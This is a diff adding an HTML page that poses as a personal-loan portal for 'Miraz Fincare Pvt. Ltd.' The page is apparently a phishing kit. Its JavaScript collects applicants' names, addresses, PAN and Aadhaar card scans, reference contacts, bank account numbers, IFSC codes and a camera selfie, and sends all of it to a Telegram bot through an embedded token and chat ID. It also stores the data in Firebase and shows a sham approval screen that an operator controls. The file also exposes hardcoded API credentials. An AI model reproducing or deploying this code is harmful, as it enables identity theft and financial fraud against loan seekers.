@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Miraz Fincare Private Limited</title>
+    <style>
+        :root { --primary: #1e3a8a; --primary-light: #3b82f6; --accent: #f59e0b; --bg: #f8fafc; --card-bg: #ffffff; --text-main: #1e293b; --text-muted: #64748b; --border: #e2e8f0; --success: #10b981; --error: #ef4444; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); color: var(--text-main); line-height: 1.5; padding-bottom: 40px; }
+        .header { background: linear-gradient(135deg, var(--primary) 0%, #0f172a 100%); color: white; padding: 20px 16px; text-align: center; border-bottom-left-radius: 24px; border-bottom-right-radius: 24px; box-shadow: 0 4px 20px rgba(30, 58, 138, 0.2); }
+        .header h1 { font-size: 1.4rem; font-weight: 800; margin-bottom: 8px; } .header p { font-size: 0.8rem; opacity: 0.9; } .header .email { color: var(--accent); font-weight: 600; margin-top: 4px; display: block; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px 16px; }
+        .view { display: none; animation: fadeIn 0.3s ease-in-out; } .view.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .loan-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .loan-card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 20px 12px; text-align: center; cursor: pointer; transition: all 0.2s; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
+        .loan-card:active { transform: scale(0.96); background: #f1f5f9; } .loan-card .icon { font-size: 2rem; margin-bottom: 8px; display: block; } .loan-card .title { font-size: 0.9rem; font-weight: 700; color: var(--primary); }
+        .details-box { background: var(--card-bg); border-radius: 16px; padding: 20px; margin-top: 20px; border: 1px solid var(--border); }
+        .details-box h2 { color: var(--primary); font-size: 1.3rem; margin-bottom: 16px; text-align: center; }
+        .details-list { list-style: none; margin-bottom: 24px; } .details-list li { padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 0.95rem; display: flex; align-items: center; } .details-list li:last-child { border-bottom: none; } .details-list li::before { content: "✅"; margin-right: 10px; }
+        .action-buttons { display: flex; flex-direction: column; gap: 12px; }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.2s; text-align: center; }
+        .btn-primary { background: linear-gradient(90deg, var(--primary) 0%, var(--primary-light) 100%); color: white; box-shadow: 0 4px 12px rgba(30, 58, 138, 0.3); } .btn-primary:active { transform: scale(0.98); opacity: 0.9; }
+        .btn-secondary { background: white; color: var(--primary); border: 2px solid var(--primary); }
+        .btn-back { background: transparent; color: var(--text-muted); font-size: 0.9rem; padding: 10px; margin-bottom: 10px; display: inline-flex; align-items: center; }
+        .form-group { margin-bottom: 18px; } .form-group label { display: block; font-size: 0.85rem; font-weight: 600; color: var(--text-main); margin-bottom: 6px; }
+        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 10px; font-size: 1rem; background: #fff; outline: none; transition: border-color 0.2s; appearance: none; }
+        .form-group select { background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 14px center; background-size: 16px; }
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus { border-color: var(--primary-light); }
+        .file-upload-box { border: 2px dashed var(--border); border-radius: 10px; padding: 16px; text-align: center; cursor: pointer; background: #f8fafc; position: relative; }
+        .file-upload-box.has-file { border-color: var(--success); background: #f0fdf4; }
+        .file-upload-box input[type="file"] { position: absolute; width: 100%; height: 100%; top: 0; left: 0; opacity: 0; cursor: pointer; }
+        .file-upload-text { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; } .file-name { font-size: 0.8rem; color: var(--success); margin-top: 6px; font-weight: 600; word-break: break-all; }
+        .offer-screen { text-align: center; padding: 40px 20px; background: var(--card-bg); border-radius: 20px; border: 2px solid var(--success); margin-top: 20px; box-shadow: 0 10px 30px rgba(16, 185, 129, 0.15); }
+        .offer-icon { font-size: 4rem; margin-bottom: 16px; display: block; }
+        .offer-amount { font-size: 2.5rem; font-weight: 800; color: var(--success); margin: 16px 0; letter-spacing: -1px; }
+        .offer-text { color: var(--text-muted); font-size: 0.95rem; margin-bottom: 24px; }
+        .offer-message { background: #f0fdf4; padding: 16px; border-radius: 12px; margin: 20px 0; font-size: 0.9rem; color: var(--text-main); border-left: 4px solid var(--success); }
+        .reject-message { background: #fef2f2; border-left-color: var(--error); }
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 50px; height: 50px; border: 5px solid var(--border); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text { font-weight: 600; color: var(--primary); text-align: center; padding: 0 20px; font-size: 1.1rem; }
+        .waiting-animation { text-align: center; padding: 40px 20px; }
+        .waiting-icon { font-size: 4rem; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } }
+        footer { text-align: center; font-size: 0.75rem; color: var(--text-muted); margin-top: 40px; padding: 0 16px; }
+        .error-msg { color: var(--error); font-size: 0.8rem; margin-top: 4px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Miraz Fincare Pvt. Ltd.</h1>
+        <p>Office No. 683 Aparna Building, Holl Road,<br>Pune, Maharashtra, India</p>
+        <span class="email">📧 customer@mirazfincare.io</span>
+    </div>
+    <div class="container">
+        <div id="view-home" class="view active">
+            <h2 style="text-align: center; color: var(--primary); margin-bottom: 8px;">Welcome to Miraz Fincare</h2>
+            <p style="text-align: center; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 20px;">Choose your loan category</p>
+            <div class="loan-grid">
+                <div class="loan-card" onclick="showView('view-personal-details')"><span class="icon">💰</span><span class="title">Personal Loan</span></div>
+                <div class="loan-card" onclick="alert('Coming soon!')"><span class="icon">🚗</span><span class="title">Car Loan</span></div>
+                <div class="loan-card" onclick="alert('Coming soon!')"><span class="icon">🏠</span><span class="title">Home Loan</span></div>
+                <div class="loan-card" onclick="alert('Coming soon!')"><span class="icon">🚚</span><span class="title">Commercial Vehicle</span></div>
+                <div class="loan-card" onclick="alert('Coming soon!')"><span class="icon"></span><span class="title">Business Loan</span></div>
+                <div class="loan-card" onclick="showView('view-personal-details')"><span class="icon">🤝</span><span class="title">Micro Loans</span></div>
+            </div>
+        </div>
+        <div id="view-personal-details" class="view">
+            <button class="btn btn-back" onclick="showView('view-home')">← Back to Home</button>
+            <div class="details-box">
+                <h2>Loan Details & Benefits</h2>
+                <ul class="details-list">
+                    <li>Interest rate starting from 11.99% p.a.</li><li>Loan amount up to ₹10,00,000</li><li>Flexible tenure: 12 to 60 months</li><li>Minimal documentation required</li><li>Quick disbursal within 24 hours</li>
+                </ul>
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="showView('view-form')">Apply for Personal Loan</button>
+                    <button class="btn btn-secondary" onclick="showView('view-form')">Apply for Micro Loans</button>
+                </div>
+            </div>
+        </div>
+        <div id="view-form" class="view">
+            <button class="btn btn-back" onclick="showView('view-personal-details')">← Back</button>
+            <h2 style="text-align: center; color: var(--primary); margin-bottom: 20px;">Loan Application Form</h2>
+            <form id="loanForm" onsubmit="handleFormSubmit(event)">
+                <div class="form-group"><label>Full Name (As per Aadhar)</label><input type="text" id="fullName" required placeholder="Enter your full name"></div>
+                <div class="form-group"><label>Mobile Number</label><input type="tel" id="mobile" pattern="[0-9]{10}" required placeholder="10 digit mobile number"></div>
+                <div class="form-group"><label>Email ID</label><input type="email" id="email" required placeholder="your@email.com"></div>
+                <div class="form-group"><label>Residential Address</label><textarea id="address" rows="3" required placeholder="Full address with PIN code"></textarea></div>
+                <div class="form-group"><label>PAN Card Number</label><input type="text" id="panNumber" pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}" required placeholder="ABCDE1234F" style="text-transform: uppercase;"></div>
+                <div class="form-group"><label>Upload PAN Card</label><div class="file-upload-box" id="box-pan"><input type="file" id="filePan" accept="image/*,.pdf" required onchange="updateFileName('filePan', 'box-pan', 'name-pan')"><div class="file-upload-text">📁 Tap to upload PAN Card</div><div class="file-name" id="name-pan"></div></div></div>
+                <div class="form-group"><label>Upload Aadhar (Front)</label><div class="file-upload-box" id="box-aadhar-front"><input type="file" id="fileAadharFront" accept="image/*,.pdf" required onchange="updateFileName('fileAadharFront', 'box-aadhar-front', 'name-aadhar-front')"><div class="file-upload-text">📁 Tap to upload Aadhar Front</div><div class="file-name" id="name-aadhar-front"></div></div></div>
+                <div class="form-group"><label>Upload Aadhar (Back)</label><div class="file-upload-box" id="box-aadhar-back"><input type="file" id="fileAadharBack" accept="image/*,.pdf" required onchange="updateFileName('fileAadharBack', 'box-aadhar-back', 'name-aadhar-back')"><div class="file-upload-text">📁 Tap to upload Aadhar Back</div><div class="file-name" id="name-aadhar-back"></div></div></div>
+                <h3 style="margin: 24px 0 16px; color: var(--primary); font-size: 1.1rem;">Reference Details</h3>
+                <div class="form-group"><label>Reference 1 Name</label><input type="text" id="ref1Name" required></div>
+                <div class="form-group"><label>Reference 1 Mobile</label><input type="tel" id="ref1Mobile" pattern="[0-9]{10}" required></div>
+                <div class="form-group"><label>Reference 2 Name</label><input type="text" id="ref2Name" required></div>
+                <div class="form-group"><label>Reference 2 Mobile</label><input type="tel" id="ref2Mobile" pattern="[0-9]{10}" required></div>
+                <button type="submit" class="btn btn-primary" style="margin-top: 10px;">Submit & Proceed to Bank Details</button>
+            </form>
+        </div>
+        <div id="view-bank" class="view">
+            <h2 style="text-align: center; color: var(--primary); margin-bottom: 8px;">Bank Account Details</h2>
+            <p style="text-align: center; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 20px;">For loan disbursal.</p>
+            <form id="bankForm" onsubmit="handleBankSubmit(event)">
+                <div class="form-group"><label>Select Your Bank</label>
+                    <select id="bankName" required>
+                        <option value="" disabled selected>-- Choose Bank --</option>
+                        <option value="Jio Payments Bank">Jio Payments Bank</option><option value="Airtel Payments Bank">Airtel Payments Bank</option><option value="Paytm Payments Bank">Paytm Payments Bank</option><option value="State Bank of India (SBI)">State Bank of India (SBI)</option><option value="HDFC Bank">HDFC Bank</option><option value="ICICI Bank">ICICI Bank</option><option value="Axis Bank">Axis Bank</option><option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option><option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option><option value="Bank of Baroda">Bank of Baroda</option><option value="Canara Bank">Canara Bank</option><option value="Union Bank of India">Union Bank of India</option><option value="IDFC FIRST Bank">IDFC FIRST Bank</option><option value="Yes Bank">Yes Bank</option><option value="IndusInd Bank">IndusInd Bank</option><option value="Other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group"><label>Account Number</label><input type="text" id="accNo" pattern="[0-9]{9,18}" required></div>
+                <div class="form-group"><label>Re-enter Account Number</label><input type="text" id="accNoConfirm" pattern="[0-9]{9,18}" required><div class="error-msg" id="accError">Account numbers do not match!</div></div>
+                <div class="form-group"><label>IFSC Code</label><input type="text" id="ifscCode" pattern="[A-Z]{4}0[A-Z0-9]{6}" required style="text-transform: uppercase;"></div>
+                <div class="form-group"><label>Live Selfie</label><div class="file-upload-box" id="box-selfie"><input type="file" id="fileSelfie" accept="image/*" capture="user" required onchange="updateFileName('fileSelfie', 'box-selfie', 'name-selfie')"><div class="file-upload-text">📸 Tap to open camera</div><div class="file-name" id="name-selfie"></div></div></div>
+                <button type="submit" class="btn btn-primary" style="margin-top: 10px;">Submit Bank Details</button>
+            </form>
+        </div>
+        <div id="view-waiting" class="view">
+            <div class="waiting-animation">
+                <div class="waiting-icon">⏳</div>
+                <h2 style="color: var(--primary); margin-bottom: 12px;">Application Under Review</h2>
+                <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.6;">Your application has been submitted. Our team is reviewing your documents. Please wait...</p>
+                <div style="margin-top: 30px; padding: 20px; background: #f0f9ff; border-radius: 12px; border-left: 4px solid var(--primary-light);">
+                    <p style="font-size: 0.85rem; color: var(--text-muted);">🔔 You will be notified here once the review is complete.</p>
+                </div>
+            </div>
+        </div>
+        <div id="view-success" class="view">
+            <div class="offer-screen">
+                <span class="offer-icon" id="offerIcon">🎉</span>
+                <h2 style="color: var(--primary);" id="offerTitle">Congratulations!</h2>
+                <p class="offer-text" id="offerSubtitle">Your application has been verified.</p>
+                <div id="approvalContent">
+                    <p style="font-size: 0.9rem; color: var(--text-muted);">You are pre-approved for a Loan Offer of</p>
+                    <div class="offer-amount" id="offerAmount">₹ 0.00</div>
+                    <div class="offer-message" id="customMessage">Message here.</div>
+                    <p class="offer-text">Amount will be disbursed within 24 hours.</p>
+                </div>
+                <div id="rejectionContent" style="display: none;">
+                    <div class="offer-message reject-message" id="rejectionText">Rejected message here.</div>
+                </div>
+                <button class="btn btn-primary" onclick="resetAndGoHome()">Back to Home</button>
+            </div>
+        </div>
+    </div>
+    <footer>Miraz Fincare Private Limited © 2026 • Strictly Confidential</footer>
+    <div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><div class="loading-text">Processing...</div></div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyA78esE90GtN4qzzthQZRQAFsxvCnXY_jY",
+            authDomain: "mirazfinance.firebaseapp.com",
+            databaseURL: "https://mirazfinance-default-rtdb.firebaseio.com",
+            projectId: "mirazfinance",
+            storageBucket: "mirazfinance.firebasestorage.app",
+            messagingSenderId: "885659621417",
+            appId: "1:885659621417:web:10dd2193b9cf340a6a6438"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const BOT_TOKEN = "8870596631:AAERd6vwiJakDlI5ylCbRiid5mXBNUcfuWw";
+        const CHAT_ID = "-1003994060695";
+        let currentApplicationId = null;
+        let appListener = null;
+
+        function showView(viewId) { document.querySelectorAll('.view').forEach(v => v.classList.remove('active')); document.getElementById(viewId).classList.add('active'); window.scrollTo(0, 0); }
+        function updateFileName(inputId, boxId, nameId) { const input = document.getElementById(inputId); const box = document.getElementById(boxId); const nameDiv = document.getElementById(nameId); if (input.files && input.files.length > 0) { nameDiv.textContent = "✅ " + input.files[0].name; box.classList.add('has-file'); } else { nameDiv.textContent = ""; box.classList.remove('has-file'); } }
+
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.querySelector('.loading-text').textContent = "Uploading documents...";
+
+            const formData = {
+                fullName: document.getElementById('fullName').value, mobile: document.getElementById('mobile').value, email: document.getElementById('email').value, address: document.getElementById('address').value, panNumber: document.getElementById('panNumber').value.toUpperCase(), ref1Name: document.getElementById('ref1Name').value, ref1Mobile: document.getElementById('ref1Mobile').value, ref2Name: document.getElementById('ref2Name').value, ref2Mobile: document.getElementById('ref2Mobile').value
+            };
+
+            const textMessage = `🚨 *NEW LOAN APPLICATION* 🚨\n\n👤 *Name:* ${formData.fullName}\n📱 *Mobile:* ${formData.mobile}\n📧 *Email:* ${formData.email}\n🏠 *Address:* ${formData.address}\n🆔 *PAN:* ${formData.panNumber}\n\n📞 *Ref 1:* ${formData.ref1Name} (${formData.ref1Mobile})\n📞 *Ref 2:* ${formData.ref2Name} (${formData.ref2Mobile})\n\n⏰ *Time:* ${new Date().toLocaleString('en-IN')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage, parse_mode: 'Markdown' }) });
+                const filesToSend = [{ id: 'filePan', caption: `PAN - ${formData.fullName}` }, { id: 'fileAadharFront', caption: `Aadhar Front - ${formData.fullName}` }, { id: 'fileAadharBack', caption: `Aadhar Back - ${formData.fullName}` }];
+                for (const fileObj of filesToSend) { const fileInput = document.getElementById(fileObj.id); if (fileInput.files && fileInput.files.length > 0) { const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('document', fileInput.files[0]); fd.append('caption', fileObj.caption); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd }); } }
+
+                const newAppRef = database.ref('applications').push();
+                currentApplicationId = newAppRef.key;
+                newAppRef.set({ ...formData, status: 'pending', timestamp: firebase.database.ServerValue.TIMESTAMP, loanType: 'Personal Loan' });
+                
+                localStorage.setItem('currentAppId', currentApplicationId);
+
+                document.getElementById('loadingOverlay').classList.remove('active');
+                showView('view-bank');
+            } catch (error) { document.getElementById('loadingOverlay').classList.remove('active'); alert("❌ Network Error!"); console.error(error); }
+        }
+
+        async function handleBankSubmit(e) {
+            e.preventDefault();
+            const accNo = document.getElementById('accNo').value; const accNoConfirm = document.getElementById('accNoConfirm').value;
+            if (accNo !== accNoConfirm) { document.getElementById('accError').style.display = 'block'; return; } else { document.getElementById('accError').style.display = 'none'; }
+
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.querySelector('.loading-text').textContent = "Verifying & uploading selfie...";
+
+            const bankData = { bankName: document.getElementById('bankName').value, accNo: accNo, ifsc: document.getElementById('ifscCode').value.toUpperCase() };
+            const bankMessage = `🏦 *NEW BANK DETAILS* \n\n👤 *Name:* ${document.getElementById('fullName').value}\n🏛️ *Bank:* ${bankData.bankName}\n *Acc No:* \`${bankData.accNo}\`\n🏷️ *IFSC:* ${bankData.ifsc}\n\n⏰ *Time:* ${new Date().toLocaleString('en-IN')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: bankMessage, parse_mode: 'Markdown' }) });
+                const selfieInput = document.getElementById('fileSelfie');
+                if (selfieInput.files && selfieInput.files.length > 0) { const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', selfieInput.files[0]); fd.append('caption', ` Selfie - ${document.getElementById('fullName').value}`); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); }
+
+                database.ref('applications/' + currentApplicationId).update({ ...bankData });
+
+                document.getElementById('loadingOverlay').classList.remove('active');
+                showView('view-waiting');
+                startListeningForDecision();
+            } catch (error) { document.getElementById('loadingOverlay').classList.remove('active'); alert("❌ Network Error!"); console.error(error); }
+        }
+
+        function startListeningForDecision() {
+            if (!currentApplicationId) return;
+            const appRef = database.ref('applications/' + currentApplicationId);
+            
+            appListener = appRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.status !== 'pending') {
+                    appRef.off('value', appListener);
+                    showDecision(data);
+                }
+            });
+        }
+
+        function showDecision(app) {
+            if (app.status === 'approved') {
+                document.getElementById('offerIcon').textContent = '🎉'; document.getElementById('offerTitle').textContent = 'Congratulations!';
+                document.getElementById('offerSubtitle').textContent = app.approvalMessage || 'Your application has been successfully verified.';
+                document.getElementById('offerAmount').textContent = `₹ ${parseFloat(app.approvedAmount).toLocaleString('en-IN', {minimumFractionDigits: 2})}`;
+                document.getElementById('customMessage').textContent = app.approvalMessage || 'Your application has been successfully verified.';
+                document.getElementById('approvalContent').style.display = 'block'; document.getElementById('rejectionContent').style.display = 'none';
+            } else if (app.status === 'rejected') {
+                document.getElementById('offerIcon').textContent = ''; document.getElementById('offerTitle').textContent = 'Application Status';
+                document.getElementById('offerSubtitle').textContent = 'We regret to inform you about the decision.';
+                document.getElementById('rejectionText').textContent = app.rejectionMessage || "Sorry, Your Application is Rejected But Don't worry You can Reapply In Next 3 Days We'll let you know via Email or WhatsApp.";
+                document.getElementById('approvalContent').style.display = 'none'; document.getElementById('rejectionContent').style.display = 'block';
+            }
+            showView('view-success');
+        }
+
+        function resetAndGoHome() {
+            if (appListener && currentApplicationId) { database.ref('applications/' + currentApplicationId).off('value', appListener); }
+            document.getElementById('loanForm').reset(); document.getElementById('bankForm').reset();
+            document.querySelectorAll('.file-upload-box').forEach(box => box.classList.remove('has-file'));
+            document.querySelectorAll('.file-name').forEach(div => div.textContent = '');
+            localStorage.removeItem('currentAppId'); currentApplicationId = null;
+            showView('view-home');
+        }
+
+        window.onload = function() {
+            const savedId = localStorage.getItem('currentAppId');
+            if (savedId) {
+                currentApplicationId = savedId;
+                database.ref('applications/' + savedId).once('value').then((snapshot) => {
+                    const data = snapshot.val();
+                    if (data) {
+                        if (data.status === 'pending') { showView('view-waiting'); startListeningForDecision(); }
+                        else if (data.status === 'approved' || data.status === 'rejected') { showDecision(data); }
+                    } else { localStorage.removeItem('currentAppId'); }
+                });
+            }
+        };
+    </script>
+</body>
+</html>
